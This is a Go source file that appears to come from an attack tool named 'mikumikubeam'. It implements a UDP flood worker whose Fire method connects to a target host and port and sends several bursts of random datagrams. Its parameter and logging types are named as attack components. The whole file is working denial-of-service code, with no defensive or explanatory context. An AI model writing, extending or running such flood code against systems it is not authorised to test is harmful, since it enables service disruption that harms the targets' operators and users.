package udp

import (
	"context"
	"crypto/rand"
	"net"
	"strconv"
	"time"

	core "github.com/sammwyy/mikumikubeam/internal/engine"
)

type floodWorker struct{}

func NewFloodWorker() *floodWorker { return &floodWorker{} }

// Fire sends multiple bursts of random UDP datagrams to the target.
// UDP cannot be tunnelled through HTTP/SOCKS proxies in this implementation,
// so the proxy argument is accepted for interface compatibility but ignored.
func (w *floodWorker) Fire(ctx context.Context, params core.AttackParams, p core.Proxy, ua string, logCh chan<- core.AttackStats) error {
	tn := params.TargetNode
	host := tn.Hostname()
	port := tn.PortNum()
	if host == "" || port <= 0 {
		return nil
	}

	address := net.JoinHostPort(host, strconv.Itoa(port))

	// Resolve once so repeated dials stay fast.
	conn, err := net.DialTimeout("udp", address, 3*time.Second)
	if err != nil {
		return nil
	}
	defer conn.Close()

	// Log after successful connection.
	core.SendAttackLogIfVerbose(logCh, p, params.Target, params.Verbose)

	size := params.PacketSize
	if size <= 0 {
		size = 512
	}
	buf := make([]byte, size)

	deadline := time.Now().Add(2 * time.Second)
	_ = conn.SetWriteDeadline(deadline)

	// Initial burst.
	_, _ = rand.Read(buf)
	_, _ = conn.Write(buf)

	// Extra bursts within the same connection — UDP datagrams are cheap.
	const maxBursts = 4
	for i := 0; i < maxBursts; i++ {
		select {
		case <-ctx.Done():
			return nil
		default:
		}
		_, _ = rand.Read(buf)
		_, _ = conn.Write(buf)
	}
	return nil
}
